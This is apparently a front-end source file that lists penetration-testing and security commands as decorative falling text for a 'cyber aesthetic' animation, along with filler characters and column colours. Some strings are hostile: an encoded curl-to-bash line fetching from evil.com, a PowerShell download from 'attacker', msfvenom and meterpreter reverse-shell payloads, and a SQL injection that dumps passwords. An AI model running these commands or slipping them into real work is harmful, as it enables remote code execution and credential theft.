// Real code snippets from cyber security work
// These fall down the screen instead of random chars

export const codeSnippets = [
  // Nmap commands
  "nmap -sV -A -p- target.com",
  "nmap --script vuln target.com",
  "nmap -sS -sU -T4 192.168.1.0/24",
  
  // Burp Suite
  "burp intruder --attack sniper",
  "GET /admin HTTP/1.1",
  "X-Forwarded-For: 127.0.0.1",
  
  // SQLMap
  "sqlmap -u 'http://t.com?id=1' --dbs",
  "sqlmap -r req.txt --batch --dump",
  "UNION SELECT username,password FROM users",
  
  // Metasploit
  "msfconsole -q -x 'use exploit/multi/handler'",
  "msf6 > search type:exploit cve:2024",
  "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
  
  // Python security
  "import requests, sys",
  "def scan(target): return subprocess.run",
  "for port in range(1, 65535):",
  
  // Bash recon
  "for i in $(seq 1 254); do ping -c1 192.168.1.$i; done",
  "curl -s -I https://target.com | grep Server",
  "dig +short target.com ANY",
  
  // Wireshark/tcpdump
  "tcpdump -i eth0 -nn -s0 -v port 80",
  "tshark -r capture.pcap -Y 'http.request'",
  
  // Log analysis
  "grep -i 'failed password' /var/log/auth.log",
  "tail -f /var/log/apache2/access.log",
  "awk '{print $1}' access.log | sort | uniq -c",
  
  // Reverse engineering
  "objdump -d binary > disasm.txt",
  "strings suspicious.exe | grep -i pass",
  "gdb -q ./crackme",
  
  // Exploit payloads
  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
  "echo 'Y3VybCBodHRwOi8vZXZpbC5jb20=|base64 -d|bash'",
  "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1",
  
  // SIEM/Splunk
  "index=main sourcetype=access_combined status=500",
  "| stats count by src_ip | sort -count",
  
  // Threat intel
  "curl https://virustotal.com/api/v3/files/hash",
  "whois 8.8.8.8 | grep -i netname",
  
  // Privilege escalation
  "find / -perm -4000 2>/dev/null",
  "sudo -l",
  "cat /etc/passwd | grep -v nologin",
  
  // Windows/PowerShell
  "Get-Process | Where-Object {$_.CPU -gt 100}",
  "Invoke-WebRequest -Uri 'http://attacker/p.ps1'",
  "net user /domain",
];

// Japanese-looking chars for cyber aesthetic mixed in
export const fillerChars =
  "アカサタナハマヤラワ01ABCDEFｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵ";

// Color palette per column
export const columnColors = [
  "rgba(0, 255, 157,", // green
  "rgba(0, 212, 255,", // blue
  "rgba(0, 255, 157,", // green (weighted)
  "rgba(168, 85, 247,", // purple
  "rgba(0, 255, 157,", // green (weighted more)
];